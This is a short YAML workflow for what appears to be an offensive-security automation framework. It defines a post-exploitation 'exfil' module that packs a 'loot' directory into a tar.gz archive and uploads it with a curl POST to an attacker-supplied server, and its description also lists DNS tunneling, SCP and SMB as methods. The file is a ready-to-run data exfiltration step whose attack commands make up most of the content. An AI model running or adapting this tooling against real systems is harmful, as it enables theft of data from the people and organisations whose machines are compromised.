name: exfil
description: Data exfiltration — compress and exfiltrate data via HTTP POST, DNS tunneling,
  or SCP/SSH.
tags:
- post
- exfil
- data
- compress
- transfer
dispatch:
  inputs:
    target:
      required: true
      type: string
      description: Path to loot directory or files to exfiltrate
      alias: t
    method:
      type: string
      default: http
      description: 'Exfil method: http, dns, scp, smb'
    server:
      type: string
      default: ''
      description: Exfil server (required for http/scp)
    log_command:
      type: string
      default: 'true'
      description: Enable command logging
jobs:
  compress:
    name: Compress Loot
    steps:
    - name: tar-gz
      module: local.builtin.shell
      with:
        cmd: tar -czf {{ env.OFX_RUN_DIR }}/loot.tar.gz -C {{ inputs.target }} . 2>&1
      continue-on-error: true
      log-command: '{{ inputs.log_command }}'
    - name: checksum
      module: local.checksum
      with: {}
  exfil-http:
    name: HTTP Exfiltration
    run_if: '{{ inputs.method == ''http'' and inputs.server }}'
    needs:
    - compress
    steps:
    - name: curl-post
      module: local.builtin.shell
      with:
        cmd: curl -X POST -F "file=@{{ env.OFX_RUN_DIR }}/loot.tar.gz" {{ inputs.server
          }}/upload 2>&1
      continue-on-error: true
      log-command: '{{ inputs.log_command }}'